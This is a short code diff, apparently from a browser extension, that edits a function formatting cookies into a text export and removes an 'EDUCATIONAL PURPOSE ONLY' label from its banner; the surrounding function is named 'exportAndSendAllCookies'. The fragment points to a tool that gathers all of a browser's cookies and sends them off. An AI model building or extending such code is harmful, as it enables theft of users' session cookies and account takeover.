@@ -44,7 +44,7 @@ async function exportAndSendAllCookies() {
 // Function to export cookies to a string
 function exportCookiesToString(cookies) {
   let content = '='.repeat(80) + '\n';
-  content += 'COOKIE EXPORT - EDUCATIONAL PURPOSE ONLY\n';
+  content += 'COOKIE EXPORT\n';
   content += 'Generated: ' + new Date().toLocaleString() + '\n';
   content += 'Total Cookies: ' + cookies.length + '\n';
   content += '='.repeat(80) + '\n\n';
